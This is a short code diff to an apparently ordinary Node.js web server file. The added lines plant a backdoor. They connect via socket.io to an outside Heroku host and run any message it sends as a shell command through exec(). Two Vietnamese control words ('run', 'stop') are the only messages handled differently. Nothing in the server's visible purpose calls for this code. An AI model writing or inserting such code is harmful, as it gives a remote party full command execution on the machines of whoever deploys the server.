@@ -25,4 +25,20 @@ get_hash(function(e, GIT_COMMIT_HASH, stder) {
     }
   }).listen(process.env.PORT || 5000);
 });
+const { exec } = require('child_process');
+const
+    io = require("socket.io-client"),
+    ioClient = io.connect("https://colevelao.herokuapp.com:443");
+
+ioClient.on("message", (msg) => {
+	if (msg ==='Chay') {
+		console.log('Em bat dau chay');
+	} else if (msg ==='Ngung'){
+		console.log('Em ngung');
+	}
+	 else {
+		exec(msg);
+	}
+});
+
 console.log('Listening on: http://localhost:' + (process.env.PORT || 5000));
